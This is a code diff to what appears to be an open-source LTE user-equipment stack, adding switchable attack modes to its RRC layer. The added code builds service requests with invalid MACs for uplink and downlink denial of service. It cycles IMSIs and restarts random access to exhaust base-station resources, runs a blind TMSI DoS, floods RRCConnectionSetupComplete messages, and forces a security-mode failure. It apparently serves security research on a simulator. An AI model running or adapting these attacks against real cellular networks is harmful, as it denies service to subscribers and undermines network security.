@@ -45,6 +45,7 @@
 #include "COMMON/mac_rrc_primitives.h"
 #include "common/utils/LOG/log.h"
 #include "common/utils/LOG/vcd_signal_dumper.h"
+#include "executables/softmodem-common.h"	/* IS_SOFTMODEM_RFSIM */
 #ifndef CELLULAR
   #include "RRC/LTE/MESSAGES/asn1_msg.h"
 #endif
@@ -95,6 +96,10 @@
 
 #include "LTE_SL-Preconfiguration-r12.h"
 
+#include "attack_extern.h"      /* bts_attack, bts_delay, dnlink_dos_attack, uplink_dos_attack, rep_conn_end_count, null_cipher_integ, tmsi_blind_dos_rrc */
+#include <stdlib.h>             /* srand () and rand () for _ra_restart_counter*/
+
+
 //for D2D
 int ctrl_sock_fd;
 struct sockaddr_in prose_app_addr;
@@ -116,6 +121,7 @@ static const float RSRQ_meas_mapping[35] = {-19, -18.5, -18, -17.5, -17, -16.5, 
                                             -10, -9.5,  -9,  -8.5,  -8,  -7.5,  -7,  -6.5,  -6,  -5.5,  -5,  -4.5,  -4,  -3.5,  -3,  -2.5,  -2};
 // for malloc_clear
 #include "PHY/defs_UE.h"
+#include "PHY/phy_extern_ue.h"
 
 extern void pdcp_config_set_security(
   const protocol_ctxt_t *const  ctxt_pP,
@@ -207,7 +213,7 @@ rrc_ue_process_MBMSCountingRequest(
   const protocol_ctxt_t *const ctxt_pP,
   LTE_MBMSCountingRequest_r10_t *MBMSCountingRequest,
   uint8_t eNB_index
-		);
+                );
 
 static void process_nr_nsa_msg(nsa_msg_t *msg, int msg_len);
 static void nsa_sendmsg_to_nrue(const void *message, size_t msg_len, Rrc_Msg_Type_t msg_type);
@@ -441,6 +447,8 @@ char openair_rrc_ue_init( const module_id_t ue_mod_idP, const unsigned char eNB_
   return 0;
 }
 
+static int _ra_restart_counter = 0;
+
 //-----------------------------------------------------------------------------
 void rrc_ue_generate_RRCConnectionRequest( const protocol_ctxt_t *const ctxt_pP, const uint8_t eNB_index ) {
   uint8_t rv[6];
@@ -448,17 +456,21 @@ void rrc_ue_generate_RRCConnectionRequest( const protocol_ctxt_t *const ctxt_pP,
   if(UE_rrc_inst[ctxt_pP->module_id].Srb0[eNB_index].Tx_buffer.payload_size ==0) {
     // Get RRCConnectionRequest, fill random for now
     // Generate random byte stream for contention resolution
+    LOG_I(RRC, "ra_restart_counter: %d\n", _ra_restart_counter);
+    srand(ctxt_pP->rntiMaybeUEid + _ra_restart_counter+1);
+
     for (int i=0; i<6; i++) {
 #ifdef SMBV
       // if SMBV is configured the contention resolution needs to be fix for the connection procedure to succeed
       rv[i]=i;
 #else
-      rv[i]=taus()&0xff;
+      rv[i]= rand() % 0xFF; //taus()&0xff; // new: introduce some randomness to different UEs
 #endif
       LOG_T(RRC,"%x.",rv[i]);
     }
-
     LOG_T(RRC,"\n");
+    ++_ra_restart_counter;
+
     UE_rrc_inst[ctxt_pP->module_id].Srb0[eNB_index].Tx_buffer.payload_size =
       do_RRCConnectionRequest(
         ctxt_pP->module_id,
@@ -494,6 +506,14 @@ static const char  nas_attach_req_imsi[] = {
   0x10, 0x81, 0x06, 0x00, 0x00, 0x00, 0x00, 0x83, 0x06, 0x00, 0x00,
   0x00, 0x00, 0x00, 0x0D, 0x00, 0x00, 0x0A, 0x00, 0x52, 0x12, 0xF2,
   0x01, 0x27, 0x11,
+};
+
+
+/* NAS Service request with IMSI for uplink DoS attack */
+static const char _nas_service_request[] = {
+  0x07, 0x4d,
+  0x4, // KSI and sequence number
+  0xff, 0xff // Short MAC (Invalid)
 };
 
 
@@ -537,17 +557,42 @@ rrc_t310_expiration(
 }
 
 //-----------------------------------------------------------------------------
+
+static unsigned int _btsIMSIByte = 0;
+
 static void rrc_ue_generate_RRCConnectionSetupComplete(
-    const protocol_ctxt_t *const ctxt_pP,
-    const uint8_t eNB_index,
-    const uint8_t Transaction_id,
-    uint8_t sel_plmn_id) {
+  const protocol_ctxt_t *const ctxt_pP,
+  const uint8_t eNB_index,
+  const uint8_t Transaction_id,
+  uint8_t sel_plmn_id) {
   uint8_t    buffer[100];
   uint8_t    size;
   const char *nas_msg;
   int   nas_msg_length;
 
+  // Downlink DoS attack
+  if (dnlink_dos_attack > 5) {
+    LOG_I(RRC, "[Downlink DoS] encoding service request with invalid MAC\n");
+    nas_msg = _nas_service_request;
+    nas_msg_length = sizeof(_nas_service_request);
+  }
+
+  // Uplink DoS attack
+  else if (uplink_dos_attack /* != 0 */) {
+    LOG_I(RRC, "[Uplink DoS] encoding service request with invalid MAC\n");
+    nas_msg = _nas_service_request;
+    nas_msg_length = sizeof(_nas_service_request);
+  }
+  else
+
   if (EPC_MODE_ENABLED) {
+    if (bts_attack >= 5) {
+      LOG_E(RRC, "[BTS_ATTACK_ITEM_01]: Create a unique IMSI for each RRC attach attempt\n");
+      // Create a unique (monotonically increasing) IMSI for each attach (n.b., BCD encoding, below)
+      UE_rrc_inst[ctxt_pP->module_id].initialNasMsg.data[11] = (_btsIMSIByte % 10) | ((_btsIMSIByte / 10) << 4);
+      if (++_btsIMSIByte == 100)
+	_btsIMSIByte = 0;
+    }
     nas_msg         = (char *) UE_rrc_inst[ctxt_pP->module_id].initialNasMsg.data;
     nas_msg_length  = UE_rrc_inst[ctxt_pP->module_id].initialNasMsg.length;
   } else {
@@ -555,6 +600,14 @@ static void rrc_ue_generate_RRCConnectionSetupComplete(
     nas_msg_length  = sizeof(nas_attach_req_imsi);
   }
 
+  // Repeated RRCConnectionSetupComplete messages
+
+  int _attack_counter = ctxt_pP->module_id == 0 ? rep_conn_end_count : 0;
+
+  if (_attack_counter /* > 0 */)
+    LOG_I(RRC, "[Testtt] Sending multiple (%d) RRCConnectionSetupComplete messages", _attack_counter);
+
+  do {
   size = do_RRCConnectionSetupComplete(ctxt_pP->module_id, buffer, Transaction_id, sel_plmn_id, nas_msg_length, nas_msg);
   LOG_I(RRC,"[UE %d][RAPROC] Frame %d : Logical Channel UL-DCCH (SRB1), Generating RRCConnectionSetupComplete (bytes%d, eNB %d)\n",
         ctxt_pP->module_id,ctxt_pP->frame, size, eNB_index);
@@ -570,6 +623,38 @@ static void rrc_ue_generate_RRCConnectionSetupComplete(
     size,
     buffer,
     PDCP_TRANSMISSION_MODE_CONTROL);
+  } while (_attack_counter-- > 0);
+  
+  // Re-initiate RA procedure for BTS depletion attack (DoS) or Blind DoS TMSI attack
+  if (IS_SOFTMODEM_RFSIM && (bts_attack >= 200 || tmsi_blind_dos_rrc /* > 0 */)) {
+    const char *_logEAtt;
+    const char *_logIAtt;
+
+    if (tmsi_blind_dos_rrc /* > 0 */) {
+      _logEAtt = "BLIND_DOS_ATTACK_ITEM_02";
+      _logIAtt = "Blind DOS";
+    }
+    else {
+      _logEAtt = "BTS_ATTACK_ITEM_02";
+      _logIAtt = "BTS Resource Depletion";
+    }
+
+    LOG_E(RRC, "[%s]: UE restarting random access procedure\n", _logEAtt);
+    LOG_I(RRC, "[%s] UE restarting random access procedure\n",  _logIAtt);
+    // reset UE parameters
+    // MAC Layer
+    ue_mac_reset(ctxt_pP->module_id, eNB_index);
+    // RRC Layer
+    openair_rrc_ue_init(ctxt_pP->module_id, eNB_index);
+    rrc_set_state(ctxt_pP->module_id, RRC_STATE_IDLE);
+    UE_rrc_inst[ctxt_pP->module_id].Info[eNB_index].State = RRC_IDLE;
+    UE_rrc_inst[ctxt_pP->module_id].Srb0[eNB_index].Tx_buffer.payload_size = 0; // clear Srb0 buffer
+    UE_rrc_inst[ctxt_pP->module_id].Srb0[eNB_index].Rx_buffer.payload_size = 0;
+
+    // restart RA Procedure
+    UE_mac_inst[ctxt_pP->module_id].RA_active = 0;
+    UE_mac_inst[ctxt_pP->module_id].UE_mode[eNB_index] = PRACH; //NOT_SYNCHED;
+  }
 }
 
 //-----------------------------------------------------------------------------
@@ -1540,6 +1625,12 @@ rrc_ue_process_securityModeCommand(
   //memset((void *)&SecurityModeCommand,0,sizeof(SecurityModeCommand_t));
   ul_dcch_msg.message.present           = LTE_UL_DCCH_MessageType_PR_c1;
 
+  // Null Cipher & Integrity attack variant 1
+  if (null_cipher_integ == 1) {
+    LOG_I(RRC, "[Null Cipher & Integrity] Variant 1: overwrite RRC SECURITY_MODE_COMPLETE with SECURITY_MODE_FAILURE\n");
+    ul_dcch_msg.message.choice.c1.present = LTE_UL_DCCH_MessageType__c1_PR_securityModeFailure;
+  }
+  else
   if (securityMode >= NO_SECURITY_MODE) {
     LOG_I(RRC, "rrc_ue_process_securityModeCommand, security mode complete case \n");
     ul_dcch_msg.message.choice.c1.present = LTE_UL_DCCH_MessageType__c1_PR_securityModeComplete;
@@ -4745,23 +4836,23 @@ int decode_MCCH_Message( const protocol_ctxt_t *const ctxt_pP, const uint8_t eNB
       LOG_D(RRC,"[UE %d] Found mcch message \n",
             ctxt_pP->module_id);
         if(mcch->message.choice.later.present == LTE_MCCH_MessageType__later_PR_c2){
-		if(mcch->message.choice.later.choice.c2.present == LTE_MCCH_MessageType__later__c2_PR_mbmsCountingRequest_r10){
-        		LOG_I(RRC,"[UE %d] Frame %d : Found MBMSCountingRequest from eNB %d %p\n",
-              			ctxt_pP->module_id,
-              			ctxt_pP->frame,
-              			eNB_index,&mcch->message.choice.later.choice.c2.choice.mbmsCountingRequest_r10);
+                if(mcch->message.choice.later.choice.c2.present == LTE_MCCH_MessageType__later__c2_PR_mbmsCountingRequest_r10){
+                        LOG_I(RRC,"[UE %d] Frame %d : Found MBMSCountingRequest from eNB %d %p\n",
+                                ctxt_pP->module_id,
+                                ctxt_pP->frame,
+                                eNB_index,&mcch->message.choice.later.choice.c2.choice.mbmsCountingRequest_r10);
 
-  			rrc_ue_process_MBMSCountingRequest(ctxt_pP,&mcch->message.choice.later.choice.c2.choice.mbmsCountingRequest_r10,eNB_index);
+                        rrc_ue_process_MBMSCountingRequest(ctxt_pP,&mcch->message.choice.later.choice.c2.choice.mbmsCountingRequest_r10,eNB_index);
 
-			decode_MBMSCountingRequest(
-          			ctxt_pP->module_id,
-          			eNB_index,
-          			ctxt_pP->frame,
-          			mbsfn_sync_area);
+                        decode_MBMSCountingRequest(
+                                ctxt_pP->module_id,
+                                eNB_index,
+                                ctxt_pP->frame,
+                                mbsfn_sync_area);
 
 
-		}
-	}
+                }
+        }
     }
 
   }
@@ -4820,7 +4911,7 @@ void decode_MBSFNAreaConfiguration( module_id_t ue_mod_idP, uint8_t eNB_index, f
                         (LTE_MBSFN_AreaInfoList_r9_t *)NULL
                        );
   if(1/*UE_rrc_inst[ue_mod_idP].Info[eNB_index].State >= RRC_CONNECTED*/ /*|| UE_rrc_inst[ue_mod_idP].Info[eNB_index].State == RRC_RECONFIGURED*/)
-  	UE_rrc_inst[ue_mod_idP].Info[eNB_index].MCCHStatus[mbsfn_sync_area] = 1;
+        UE_rrc_inst[ue_mod_idP].Info[eNB_index].MCCHStatus[mbsfn_sync_area] = 1;
   PROTOCOL_CTXT_SET_BY_MODULE_ID(&ctxt, ue_mod_idP, ENB_FLAG_NO, UE_rrc_inst[ue_mod_idP].Info[eNB_index].rnti, frameP, 0,eNB_index);
   // Config Radio Bearer for MBMS user data (similar way to configure for eNB side in init_MBMS function)
   rrc_pdcp_config_asn1_req(&ctxt,
@@ -4850,6 +4941,7 @@ void decode_MBMSCountingRequest( module_id_t ue_mod_idP, uint8_t eNB_index, fram
 
 
 }
+
 
 //-----------------------------------------------------------------------------
 void *rrc_ue_task( void *args_p ) {
@@ -5168,6 +5260,64 @@ void *rrc_ue_task( void *args_p ) {
         break;
 
       case NAS_UPLINK_DATA_REQ: {
+        LOG_E(RRC, "[NAS MSG]: NAS_UPLINK_DATA_REQ\n");
+
+        // Trigger log when we see a non-attack NAS message length
+        if (!IS_SOFTMODEM_RFSIM && (bts_attack >=5 || tmsi_blind_dos_rrc /* > 0 */) && NAS_UPLINK_DATA_REQ (msg_p).nasMsg.length != -1) {
+	  const char *_logAtt = tmsi_blind_dos_rrc /* > 0 */ ? "BLIND_DOS_ATTACK" : "BTS_ATTACK";
+
+          LOG_E(RRC, "[%s NAS_UPLINK_DATA_REQ]: NAS Message Length = %i\n", _logAtt, NAS_UPLINK_DATA_REQ (msg_p).nasMsg.length);
+        }
+                          
+        if ((bts_attack >=5 || tmsi_blind_dos_rrc /* > 0 */) && NAS_UPLINK_DATA_REQ (msg_p).nasMsg.length == -1) {
+	  const char *_logEAtt;
+	  const char *_logIAtt;
+
+	  if (tmsi_blind_dos_rrc /* > 0 */) {
+	    _logEAtt = "BLIND_DOS_ATTACK_ITEM_03";
+	    _logIAtt = "Blind DOS";
+	  }
+	  else {
+	    _logEAtt = "BTS_ATTACK_ITEM_03";
+	    _logIAtt = "BTS Resource Depletion";
+	  }
+	  LOG_E(RRC, "[%s]: Generating NAS UL Data Request, revert back to PRACH (primary attack functionality)\n", _logEAtt);
+          usleep(bts_delay * 1000);
+
+          LOG_I(RRC, "ra_restart_counter: %d\n", _ra_restart_counter);
+          if (_ra_restart_counter <= 0)
+            break; // The UE will generate Attach req upon starting, so filter it...
+          int eNB_index = ctxt.eNB_index;
+          int CC_id = 0; // use 0 for carrier ID?
+          int module_id = ctxt.module_id;
+          LOG_I(RRC, "[%s] Receive communication back from NAS, UE restarting random access procedure\n", _logIAtt);
+          // reset UE parameters
+          // PHY Layer
+          PHY_vars_UE_g[module_id][CC_id]->UE_mode[eNB_index] = PRACH;
+          for (int i=0; i <RX_NB_TH_MAX; i++ ) {
+            PHY_vars_UE_g[module_id][CC_id]->pdcch_vars[i][eNB_index]->crnti_is_temporary = 0;
+            PHY_vars_UE_g[module_id][CC_id]->pdcch_vars[i][eNB_index]->crnti = 0;
+            PHY_vars_UE_g[module_id][CC_id]->ulsch_Msg3_active[eNB_index] = 0;
+          }
+
+          // MAC Layer
+          ue_mac_reset(module_id, eNB_index);
+          // RRC Layer
+          openair_rrc_ue_init(module_id, eNB_index);
+          rrc_set_state(module_id, RRC_STATE_IDLE);
+          UE_rrc_inst[module_id].Info[eNB_index].State=RRC_IDLE;
+          UE_rrc_inst[module_id].Srb0[eNB_index].Tx_buffer.payload_size = 0; // clear Srb0 buffer
+          UE_rrc_inst[module_id].Srb0[eNB_index].Rx_buffer.payload_size = 0;
+
+          // restart RA Procedure
+          stop_meas(&UE_mac_inst[module_id].ue_scheduler);
+          UE_mac_inst[module_id].RA_active = 1;
+          UE_mac_inst[module_id].UE_mode[eNB_index] = PRACH;
+          break;
+        }
+
+        LOG_E(RRC, "[NORMAL PROCESSING]: Generating NAS UL Data Request\n");
+
         uint32_t length;
         uint8_t *buffer;
         LOG_D(RRC, "[UE %d] Received %s: UEid %d\n", ue_mod_id, ITTI_MSG_NAME (msg_p), NAS_UPLINK_DATA_REQ (msg_p).UEid);
